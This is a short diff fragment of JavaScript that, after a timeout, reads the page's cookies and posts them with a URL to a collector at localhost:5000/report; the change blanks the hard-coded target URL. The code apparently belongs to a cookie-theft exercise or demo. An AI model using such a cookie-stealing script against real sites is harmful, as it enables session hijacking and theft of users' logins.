@@ -9,7 +9,7 @@
         setTimeout(() => {
             // Capture cookies
             var cookies = document.cookie;
-            var targetUrl = "http://localhost:5000"; // Capture current URL
+            var targetUrl; // Capture current URL
 
             // Send a POST request with the cookies and URL
             fetch("http://localhost:5000/report", {
